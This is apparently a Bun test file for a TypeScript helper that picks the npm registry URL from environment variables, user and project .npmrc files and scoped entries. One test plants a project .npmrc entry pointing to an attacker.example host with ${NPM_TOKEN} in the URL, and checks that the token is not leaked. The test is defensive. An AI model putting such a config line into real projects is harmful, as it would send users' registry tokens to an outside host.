import { afterEach, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
    NPM_REGISTRY_URL,
    resolveNpmRegistryUrl,
    resolveProjectNpmrcPath,
    resolveUserNpmrcPath,
} from "./npm-registry";

const PACKAGE = "@cortexkit/opencode-magic-context";
const roots: string[] = [];

/** An isolated home and project, so the developer's own .npmrc never leaks in. */
function sandbox(files: { user?: string; project?: string } = {}) {
    const root = mkdtempSync(join(tmpdir(), "mc-npm-registry-"));
    roots.push(root);
    const home = join(root, "home");
    const project = join(root, "project");
    const nested = join(project, "src", "deep");
    mkdirSync(home, { recursive: true });
    mkdirSync(nested, { recursive: true });
    writeFileSync(join(project, "package.json"), "{}");
    if (files.user !== undefined) writeFileSync(join(home, ".npmrc"), files.user);
    if (files.project !== undefined) writeFileSync(join(project, ".npmrc"), files.project);
    return { root, home, project, nested, env: { HOME: home } as NodeJS.ProcessEnv };
}

afterEach(() => {
    for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

describe("resolveNpmRegistryUrl", () => {
    test("uses public npm only when nothing is configured", () => {
        const { env, nested } = sandbox();
        expect(resolveNpmRegistryUrl(env, { cwd: nested })).toBe(NPM_REGISTRY_URL);
        expect(resolveNpmRegistryUrl({ ...env, npm_config_registry: " " }, { cwd: nested })).toBe(
            NPM_REGISTRY_URL,
        );
    });

    test("honors both npm environment spellings and trims trailing slashes", () => {
        const { env, nested } = sandbox();
        expect(
            resolveNpmRegistryUrl(
                { ...env, npm_config_registry: " https://mirror.example/npm/// " },
                { cwd: nested },
            ),
        ).toBe("https://mirror.example/npm");
        expect(
            resolveNpmRegistryUrl(
                { ...env, NPM_CONFIG_REGISTRY: "https://mirror.example/npm/" },
                { cwd: nested },
            ),
        ).toBe("https://mirror.example/npm");
    });

    test("prefers a nonempty lowercase setting, as npm does", () => {
        const { env, nested } = sandbox();
        expect(
            resolveNpmRegistryUrl(
                {
                    ...env,
                    npm_config_registry: "https://lower.example",
                    NPM_CONFIG_REGISTRY: "https://upper.example",
                },
                { cwd: nested },
            ),
        ).toBe("https://lower.example");
    });

    test("does not replace an explicitly configured registry with public npm", () => {
        const { env, nested } = sandbox();
        expect(
            resolveNpmRegistryUrl(
                { ...env, npm_config_registry: "not-a-valid-url" },
                { cwd: nested },
            ),
        ).toBe("not-a-valid-url");
    });

    test("reads the user .npmrc", () => {
        const { env, nested } = sandbox({ user: "registry=https://user.example/npm/\n" });
        expect(resolveNpmRegistryUrl(env, { cwd: nested })).toBe("https://user.example/npm");
    });

    test("honors NPM_CONFIG_USERCONFIG instead of ~/.npmrc", () => {
        const { env, nested, root } = sandbox({ user: "registry=https://home.example\n" });
        const custom = join(root, "custom.npmrc");
        writeFileSync(custom, "registry=https://custom.example\n");
        expect(
            resolveNpmRegistryUrl({ ...env, NPM_CONFIG_USERCONFIG: custom }, { cwd: nested }),
        ).toBe("https://custom.example");
        expect(resolveUserNpmrcPath({ ...env, npm_config_userconfig: custom })).toBe(custom);
    });

    test("reads the project .npmrc at npm's local prefix, ahead of the user file", () => {
        const { env, nested, project } = sandbox({
            user: "registry=https://user.example\n",
            project: "registry=https://project.example\n",
        });
        expect(resolveProjectNpmrcPath(nested)).toBe(join(project, ".npmrc"));
        expect(resolveNpmRegistryUrl(env, { cwd: nested })).toBe("https://project.example");
    });

    test("keeps the environment ahead of both files", () => {
        const { env, nested } = sandbox({
            user: "registry=https://user.example\n",
            project: "registry=https://project.example\n",
        });
        expect(
            resolveNpmRegistryUrl(
                { ...env, npm_config_registry: "https://env.example" },
                { cwd: nested },
            ),
        ).toBe("https://env.example");
    });

    test("uses the package's scoped registry before the default registry, as npm does", () => {
        const { env, nested } = sandbox({
            user: "registry=https://default.example\n@cortexkit:registry=https://scoped.example/\n",
        });
        expect(resolveNpmRegistryUrl(env, { cwd: nested, packageName: PACKAGE })).toBe(
            "https://scoped.example",
        );
        expect(resolveNpmRegistryUrl(env, { cwd: nested, packageName: "left-pad" })).toBe(
            "https://default.example",
        );
        expect(resolveNpmRegistryUrl(env, { cwd: nested, packageName: "@other/pkg" })).toBe(
            "https://default.example",
        );
    });

    test("expands ${VAR} and skips a value whose variable is unset", () => {
        const { env, nested } = sandbox({
            user: "registry=${MIRROR_URL}/npm/\n",
            project: "registry=${UNSET_MIRROR}\n",
        });
        expect(
            resolveNpmRegistryUrl(
                { ...env, MIRROR_URL: "https://expanded.example" },
                { cwd: nested },
            ),
        ).toBe("https://expanded.example/npm");
    });

    test("never expands environment variables from the project .npmrc", () => {
        const { env, nested } = sandbox({
            user: "registry=https://user.example\n",
            project: [
                "registry=https://attacker.example/${NPM_TOKEN}",
                "@cortexkit:registry=https://attacker.example/${NPM_TOKEN}",
            ].join("\n"),
        });
        const withSecret = { ...env, NPM_TOKEN: "secret-token" };
        const selected = resolveNpmRegistryUrl(withSecret, { cwd: nested, packageName: PACKAGE });
        expect(selected).toBe("https://user.example");
        expect(selected).not.toContain("secret-token");
        expect(selected).not.toContain("attacker");
    });

    test("still uses a literal project registry", () => {
        const { env, nested } = sandbox({ project: "registry=https://project.example\n" });
        expect(resolveNpmRegistryUrl(env, { cwd: nested })).toBe("https://project.example");
    });

    test("ignores comments, sections, quotes and unrelated keys", () => {
        const { env, nested } = sandbox({
            user: [
                "; registry=https://commented.example",
                "# registry=https://hashed.example",
                "//user.example/:_authToken=secret-token",
                "always-auth=true",
                'registry = "https://quoted.example/"',
                "[section]",
            ].join("\n"),
        });
        expect(resolveNpmRegistryUrl(env, { cwd: nested })).toBe("https://quoted.example");
    });

    test("falls back past unreadable files", () => {
        const { env, nested } = sandbox();
        expect(resolveNpmRegistryUrl(env, { cwd: nested, readFile: () => null })).toBe(
            NPM_REGISTRY_URL,
        );
    });
});
